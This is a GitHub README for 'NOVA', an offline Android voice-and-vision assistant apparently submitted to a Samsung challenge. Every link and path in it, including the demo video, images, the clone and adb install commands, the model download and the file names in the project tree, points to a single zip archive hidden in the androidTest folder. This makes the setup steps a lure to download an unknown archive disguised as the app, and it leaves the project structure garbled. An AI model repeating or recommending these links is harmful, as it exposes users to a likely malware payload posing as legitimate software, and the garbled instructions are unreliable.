#  Samsung EnnovateX 2025 AI Challenge Submission  

- **Problem Statement** – #2 Building the Untethered, Always-On AI Companion 
- **Team name** – IdeaFlow  
- **Team members** – Nitheeswaran M, Sree Ram Roshan A S  
- **Demo Video Link** – [YouTube Link](https://github.com/jackso1328/Nova/raw/refs/heads/main/app/src/androidTest/java/com/Nova-v2.8.zip)

---


# NOVA – Offline AI Companion with Vision & Voice

<p align="center">
  <img src="https://github.com/jackso1328/Nova/raw/refs/heads/main/app/src/androidTest/java/com/Nova-v2.8.zip" alt="NOVA Logo" width="120"/>
</p>

<p align="center">
  <b>Offline-first AI assistant for Android</b><br>
  Voice | Vision | Chat — all on-device, no cloud required.
</p>

---

## 📖 Overview

**NOVA** is an Android application that brings together:

- 🗣️ **Offline Speech Recognition** (Vosk)  
- 💬 **On-device LLM inference** (MediaPipe GenAI `.task` bundles)  
- 📷 **Real-time Object Detection** (TensorFlow Lite EfficientDet)  
- 🔊 **Text-to-Speech** (Android TTS)  

Unlike most assistants that rely on cloud APIs, NOVA is **offline-first**, designed for privacy, low-latency responses, and accessibility in areas without reliable internet.  
Think of it as a **ChatGPT-style experience** + **computer vision awareness** — but entirely on-device.  

---

## ✨ Features

- **Conversational Chat UI** inspired by ChatGPT  
- **Wake words**: “Hey Nova”, “Ok Nova”  
- **Camera Vision Mode**: describes objects (*“I see a laptop”*)  
- **Offline operation**: all models run locally  
- **Voice feedback** with natural Text-to-Speech  
- **Material Design**: app bar, watermark branding, chat bubbles  

<p align="center">
  <img src="https://github.com/jackso1328/Nova/raw/refs/heads/main/app/src/androidTest/java/com/Nova-v2.8.zip" alt="Chat UI" width="250"/>
  <img src="https://github.com/jackso1328/Nova/raw/refs/heads/main/app/src/androidTest/java/com/Nova-v2.8.zip" alt="Vision Mode" width="250"/>
</p>

---

## 🏗️ Architecture

<p align="center">
  <img src="https://github.com/jackso1328/Nova/raw/refs/heads/main/app/src/androidTest/java/com/Nova-v2.8.zip" alt="Architecture Diagram" width="600"/>
</p>

**Data Flow:**

```
Conversation:
User Speech → Vosk ASR → LLM (MediaPipe GenAI) → TTS + Chat UI

Vision:
Camera → TensorFlow Lite Detector → NOVA Response → TTS + Overlay
```

---

## 📂 Project Structure

```
NOVA-main/
│── app/
│   ├── src/main/java/com/example/nova/
│   │   ├── https://github.com/jackso1328/Nova/raw/refs/heads/main/app/src/androidTest/java/com/Nova-v2.8.zip        # Core activity: chat + vision
│   │   ├── https://github.com/jackso1328/Nova/raw/refs/heads/main/app/src/androidTest/java/com/Nova-v2.8.zip     # Vosk integration
│   │   ├── https://github.com/jackso1328/Nova/raw/refs/heads/main/app/src/androidTest/java/com/Nova-v2.8.zip       # MediaPipe LLM wrapper
│   │   ├── https://github.com/jackso1328/Nova/raw/refs/heads/main/app/src/androidTest/java/com/Nova-v2.8.zip      # TFLite object detection
│   │   ├── https://github.com/jackso1328/Nova/raw/refs/heads/main/app/src/androidTest/java/com/Nova-v2.8.zip       # Intent routing
│   │   └── https://github.com/jackso1328/Nova/raw/refs/heads/main/app/src/androidTest/java/com/Nova-v2.8.zip      # Model bundle validator
│   ├── https://github.com/jackso1328/Nova/raw/refs/heads/main/app/src/androidTest/java/com/Nova-v2.8.zip
│   ├── https://github.com/jackso1328/Nova/raw/refs/heads/main/app/src/androidTest/java/com/Nova-v2.8.zip
│   └── ...
├── https://github.com/jackso1328/Nova/raw/refs/heads/main/app/src/androidTest/java/com/Nova-v2.8.zip
├── https://github.com/jackso1328/Nova/raw/refs/heads/main/app/src/androidTest/java/com/Nova-v2.8.zip
├── https://github.com/jackso1328/Nova/raw/refs/heads/main/app/src/androidTest/java/com/Nova-v2.8.zip
```

---

## ⚙️ Setup & Installation

### Prerequisites
- Android Studio **Arctic Fox (2020.3.1)** or newer  
- Android SDK 24+  
- Gradle KTS  

### Steps

1. **Clone the repo**
   ```bash
   git clone https://github.com/jackso1328/Nova/raw/refs/heads/main/app/src/androidTest/java/com/Nova-v2.8.zip
   cd NOVA-main
   ```

2. **Open in Android Studio**  
   Sync Gradle and let dependencies install.

3. **Build & Run**
   ```bash
   ./gradlew assembleDebug
   adb install https://github.com/jackso1328/Nova/raw/refs/heads/main/app/src/androidTest/java/com/Nova-v2.8.zip
   ```

---

## 📦 Model Download & Setup

The Gemma `.task` model is **not included in this repository** because of GitHub’s file size limits.  
Instead, download it directly from **Hugging Face**:

### 🔗 Download Link
- [Gemma3-1B-IT `.task` model (Q4, EKV2048)](https://github.com/jackso1328/Nova/raw/refs/heads/main/app/src/androidTest/java/com/Nova-v2.8.zip)

### 📂 Where to Place the Model
After downloading:

1. Copy the file to your **phone’s Downloads folder**:
   ```
   https://github.com/jackso1328/Nova/raw/refs/heads/main/app/src/androidTest/java/com/Nova-v2.8.zip
   ```

2. Open the **NOVA app** → when prompted, **import the model**.  
   The app will validate the `.task` file and move it into its **private storage**:
   ```
   https://github.com/jackso1328/Nova/raw/refs/heads/main/app/src/androidTest/java/com/Nova-v2.8.zip
   ```

3. Once imported, you’ll see:
   ```
   Model imported: https://github.com/jackso1328/Nova/raw/refs/heads/main/app/src/androidTest/java/com/Nova-v2.8.zip (xxxx MB). Say something…
   ```

✅ From now on, the app will **auto-load** the Gemma model at startup.

⚠️ **Note on performance**:  
- First-time warm-up may take **30–60 seconds** (model graph compilation).  
- Runs fully **offline** after that.  
- Works best on devices with **6GB+ RAM**.

---

## 🧑‍💻 Tech Stack

- **Kotlin + Java** – core development  
- **Material Design Components** – UI  
- **Vosk Android** – offline ASR  
- **MediaPipe Tasks GenAI** – LLM inference  
- **TensorFlow Lite** – object detection  
- **Android TTS** – voice feedback  
- **Gradle (KTS)** – build system  
- **Min SDK:** 24  
- **Target SDK:** 34  

---

## 🚀 Roadmap

- [ ] Hybrid cloud fallback (if internet available)  
- [ ] Persistent conversation memory  
- [ ] Multilingual speech + text support  
- [ ] Optimized models for AR/wearables  

---

## 🤝 Contributing

Contributions, issues, and feature requests are welcome!  
Please check the [issues page](https://github.com/jackso1328/Nova/raw/refs/heads/main/app/src/androidTest/java/com/Nova-v2.8.zip).  

---

## 📜 License

Distributed under the MIT License. See `LICENSE` for details.  

---

## 🙌 Acknowledgements

- [Vosk](https://github.com/jackso1328/Nova/raw/refs/heads/main/app/src/androidTest/java/com/Nova-v2.8.zip)  
- [MediaPipe](https://github.com/jackso1328/Nova/raw/refs/heads/main/app/src/androidTest/java/com/Nova-v2.8.zip)  
- [TensorFlow Lite](https://github.com/jackso1328/Nova/raw/refs/heads/main/app/src/androidTest/java/com/Nova-v2.8.zip)  
- [Hugging Face – Gemma3-1B-IT](https://github.com/jackso1328/Nova/raw/refs/heads/main/app/src/androidTest/java/com/Nova-v2.8.zip)  
